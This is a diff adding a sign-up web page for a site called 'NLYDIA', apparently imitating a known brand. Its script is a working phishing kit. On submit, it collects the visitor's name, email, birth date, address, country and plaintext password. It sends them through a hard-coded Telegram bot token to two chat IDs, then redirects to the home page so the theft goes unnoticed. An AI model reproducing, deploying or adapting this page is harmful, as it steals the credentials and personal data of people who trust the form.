@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign up - NLYDIA</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+            color: #000000;
+        }
+        .navbar {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            background-color: #ffffff;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            z-index: 100;
+            margin-bottom: 20px;
+        }
+        .navbar .logo {
+            margin-bottom: 10px;
+            font-size: 24px;
+            color: #000000;
+            font-weight:600;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+        .navbar .links {
+            display: flex;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+        .navbar a {
+            color: #000000;
+            text-decoration: none;
+            padding: 10px 15px;
+            transition: color 0.3s ease;
+        }
+        .navbar a:hover {
+            color: #666666;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            height: calc(100vh - 140px);
+            overflow: auto;
+            background-color: #ffffff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            z-index: 1;
+            margin-top: 20px;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"],
+        input[type="number"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #000000;
+            border-radius: 5px;
+            outline: none;
+        }
+        .birthdate {
+            display: flex;
+            justify-content: space-between;
+        }
+        .birthdate input[type="number"] {
+            width: calc(30% - 8px);
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #000000;
+            border-radius: 5px;
+            background-color: #f2f2f2;
+            color: #000000;
+            outline: none;
+        }
+        input[type="submit"] {
+            background-color: #ffffff;
+            color: #000000;
+            border: 1px solid #000000;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        input[type="submit"]:hover {
+            background-color: #eeeeee;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .checkbox-label {
+            margin-right: 10px;
+        }
+        .footer {
+            padding: 20px;
+            text-align: center;
+            background-color: #ffffff;
+            color: #000000;
+            margin-top: 40px;
+            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .footer p a,
+        .footer p a:visited {
+            color: #000000;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        @media (prefers-color-scheme: dark) {
+            body {
+                background-color: #121212;
+                color: #ffffff;
+            }
+            .navbar {
+                background-color: #1f1f1f;
+                box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            }
+            .navbar .logo {
+                color: #ffffff;
+            }
+            .navbar a {
+                color: #ffffff;
+            }
+            .navbar a:hover {
+                color: #cccccc;
+            }
+            .container {
+                background-color: #1f1f1f;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            }
+            .birthdate input[type="number"] {
+                background-color: #333;
+                color: #fff;
+            }
+            input[type="submit"] {
+                background-color: #333;
+                color: #ffffff;
+                border: 1px solid #ffffff;
+            }
+            input[type="submit"]:hover {
+                background-color: #555;
+            }
+            .footer {
+                background-color: #1f1f1f;
+                color: #ffffff;
+                box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.3);
+            }
+            .footer p a,
+            .footer p a:visited {
+                color: #ffffff;
+            }
+        }
+        @media (max-width: 768px) {
+            .navbar {
+                padding: 10px;
+            }
+            .navbar .logo {
+                font-size: 20px;
+            }
+            .navbar a {
+                padding: 8px 12px;
+            }
+            .container {
+                padding: 10px;
+            }
+            .birthdate input[type="number"] {
+                width: calc(100% - 12px);
+            }
+            input[type="submit"] {
+                padding: 8px 16px;
+            }
+            .footer {
+                margin-top: 20px;
+            }
+        }
+        .signin-button {
+            background-color: #333;
+            color: #ffffff;
+            border: 1px solid #ffffff;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .signin-button:hover {
+            background-color: #333;
+        }
+        .signin-prompt {
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div class="logo">NLYDIA</div>
+        <div class="links">
+            <a href="index.html">Home</a>
+            <a href="products.html">Products</a>
+            <a href="about.html">About Us</a>
+            <a href="contact.html">Contact Us</a>
+        </div>
+    </div>
+<div class="container">
+    <h2>Sign up</h2>
+    <form id="signupForm">
+        <input type="text" id="first_name" placeholder="First Name" required><br>
+        <input type="text" id="last_name" placeholder="Last Name" required><br>
+        <input type="email" id="email" placeholder="Your Email" required><br>
+        <div class="birthdate">
+            <input type="number" id="birthday" placeholder="Birthday" min="1" max="31" required>
+            <input type="number" id="month" placeholder="Month" min="1" max="12" required>
+            <input type="number" id="year" placeholder="Year" min="1900" max="2100" required>
+        </div>
+        <input type="text" id="address" placeholder="Address (optional)"><br>
+        <input type="text" id="country" placeholder="Country (optional)"><br>
+        <input type="password" id="password" placeholder="Password" required minlength="7"><br>
+        <div class="checkbox-container">
+            <input type="checkbox" id="human" name="human" required>
+            <label for="human" class="checkbox-label">Agree to terms</label>
+        </div>
+        <br>
+        <input type="submit" id="signupButton" value="Sign up">
+    </form>
+    <div class="spacer"></div>
+    <div class="success-message" id="successMessage" style="display: none;">Sign up successful</div>
+    <div class="signin-prompt">
+        Already have an account? 
+        <button class="signin-button" onclick="window.location.href='signin.html'">Sign in</button>
+    </div>
+</div>
+<div class="footer">
+    ©2024 NLYDIA. All rights reserved.
+    <p><a href="privacy.html" style="color: inherit;">Privacy Policy</a> | <a href="cookies.html" style="color: inherit;">Cookies Policy</a> | <a href="disclaimer.html" style="color: inherit;">Disclaimer</a></p>
+</div>
+<script>
+document.getElementById('signupForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    var firstName = document.getElementById('first_name').value;
+    var lastName = document.getElementById('last_name').value;
+    var email = document.getElementById('email').value;
+    var day = document.getElementById('birthday').value;
+    var month = document.getElementById('month').value;
+    var year = document.getElementById('year').value;
+    var address = document.getElementById('address').value;
+    var country = document.getElementById('country').value;
+    var password = document.getElementById('password').value;
+
+    var message = 'First Name: ' + firstName + '\n' +
+                  'Last Name: ' + lastName + '\n' +
+                  'Email: ' + email + '\n' +
+                  'Date of Birth: ' + day + '/' + month + '/' + year + '\n' +
+                  'Address: ' + address + '\n' +
+                  'Country: ' + country + '\n' +
+                  'Password: ' + password;
+
+    var botToken = '7243508319:AAHcGPRAkx7dgyucfW2dSAgVuNdXFumLNVg';
+    var chatId1 = '825218850';
+    var chatId2 = '1509235250';
+
+    var url1 = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+    var url2 = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+
+    var params1 = {
+        chat_id: chatId1,
+        text: message
+    };
+
+    var params2 = {
+        chat_id: chatId2,
+        text: message
+    };
+
+    fetch(url1, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(params1)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log('Message sent to first user successfully');
+
+            return fetch(url2, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(params2)
+            });
+        } else {
+            console.error('Error sending message to first user.');
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log('Message sent to second user successfully');
+
+localStorage.setItem('signupSuccess', 'true');
+            
+            window.location.href = 'index.html';
+        } else {
+            console.error('Error sending message to second user.');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+});
+</script>
+</body>
+</html>
